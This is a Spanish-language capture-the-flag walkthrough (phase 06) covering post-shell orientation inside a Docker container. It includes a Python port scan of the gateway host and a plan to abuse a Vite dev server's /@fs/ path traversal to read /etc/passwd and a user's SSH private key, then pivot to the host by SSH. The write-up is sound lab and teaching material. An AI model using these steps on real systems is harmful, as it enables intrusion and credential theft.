# Fase 06 — Dentro del contenedor: orientación y pivot hacia el host

> Acabo de conseguir shell, pero **no he terminado el foothold**: estoy en un contenedor, no en la
> máquina. Esta fase es "¿dónde estoy exactamente y qué alcanzo desde aquí?".

## 🎯 Objetivo
Orientarme en el entorno comprometido, confirmar que es un contenedor, y encontrar el **camino hacia
el host real** (donde vive `user.txt`).

## 🧭 Paso 1 — ¿Quién soy y dónde estoy?

Lo primero al caer en cualquier shell: situarse. Comandos baratos, mucha información.

```bash
id                      # datawrangler, grupos
hostname                # data-wrangler
hostname -i             # 172.17.0.X  -> rango típico de Docker (bridge)
cat /etc/hostname
ls -la / | grep -i dockerenv   # /.dockerenv presente = contenedor Docker (señal clásica)
cat /proc/1/cgroup 2>/dev/null | head   # 'docker/...' confirma contenedor
ls -la /app             # el cwd era /app -> ver qué app corre aquí
which bash sh python3 nc curl   # qué herramientas tengo (confirmamos: NO bash)
```

> 🎓 **Interpretación:** `hostname -i` en `172.17.0.0/16` + la existencia de `/.dockerenv` = estoy
> en un **contenedor Docker** sobre el bridge por defecto. Esto reencuadra el objetivo: `user.txt`
> casi seguro está en el **host**, no aquí. Mi trabajo ahora es **escapar/pivotar** al host.

## 🌉 Paso 2 — ¿Qué alcanzo desde el contenedor? (la gran pregunta)

En el bridge por defecto de Docker, el **host** es accesible desde el contenedor en la IP del
*gateway*: normalmente **`172.17.0.1`**. Recordatorio clave de la Fase 01: el puerto **3000**
estaba `filtered` **desde fuera** (VPN) — pero quizá esté escuchando **solo en localhost del host**,
y desde el contenedor sí lo vea.

Como no tengo `nmap` ni probablemente `nc` completo, escaneo con **Python puro** (que sé que hay):

```bash
python3 - <<'EOF'
import socket
for p in [22, 80, 3000, 5000, 8000, 8080, 9000]:
    s = socket.socket(); s.settimeout(0.6)
    if s.connect_ex(("172.17.0.1", p)) == 0:
        print("OPEN", p)
    s.close()
EOF
```

**Resultado:**
```
OPEN 3000
```

> 🎓 **El "click":** el 3000 que desde la VPN salía `filtered` está **vivo en el host** y es
> alcanzable desde el contenedor. Esto es exactamente por lo que un contenedor comprometido es
> peligroso: me da un punto de observación **dentro** del perímetro de red del host.

## 🔎 Paso 3 — ¿Qué es el servicio del 3000?

```bash
curl -s http://172.17.0.1:3000/ -o /tmp/v.html
sed -n '1,60p' /tmp/v.html
```

Señales que busco en el HTML:
- `<script type="module" src="/@vite/client">` o `/@react-refresh` → **Vite en modo desarrollo (HMR)**.
- Rutas tipo `/src/main.jsx` → es el **árbol de fuentes** del proyecto servido en caliente.

→ Es el **visor médico en React, servido por Vite en modo *dev***. (Encaja con el tema "médico" de la
máquina: DICOM, "AI training", etc.)

## 🧠 Hipótesis para la escalada (Fase 07)

Un servidor **Vite en modo dev** mal configurado expone **lectura arbitraria de ficheros**:

- Vite sirve ficheros del proyecto y, con `server.fs` permisivo, permite salir de la raíz vía el
  endpoint **`/@fs/<ruta-absoluta>`** o con `../` en las rutas de módulos.
- Objetivo concreto: leer la **clave SSH privada** de un usuario (el write-up apunta a `developer`):
  ```
  /@fs/home/developer/.ssh/id_rsa      (o id_ed25519)
  /@fs/etc/passwd                      (primero, para enumerar usuarios/rutas home)
  ```
- Con la clave privada → **`ssh developer@bedside.htb`** = salto del contenedor al **host real**
  (esto ES el "escape" efectivo) → **user.txt**.

> ⚠️ Pendiente de confirmar al volver: la ruta base exacta del proyecto Vite y si `/@fs/` está
> habilitado o hay que usar `../` relativo desde `/src/`. El primer `curl` del HTML me dará la pista.

## 🗒️ Estado
- [x] Confirmado: estoy en un contenedor Docker (`data-wrangler`, `172.17.0.x`, `/.dockerenv`)
- [x] Confirmado: el contenedor alcanza el host por `172.17.0.1`
- [x] Puerto `3000` OPEN en el host (el que desde fuera era `filtered`) = visor React/Vite dev
- [ ] Lectura arbitraria vía Vite dev (`/@fs/`) → leer `id_rsa` de `developer`
- [ ] `ssh developer@host` (escape del contenedor) → **user.txt**

## ➡️ Siguiente (Fase 07)
Explotar la lectura arbitraria del servidor Vite dev del 3000 para robar la clave SSH de `developer`
y saltar al host. A partir de ahí: `sudo -l` y la escalada a root (script de entrenamiento que carga
un checkpoint de PyTorch/MONAI = **misma clase de bug**, deserialización).
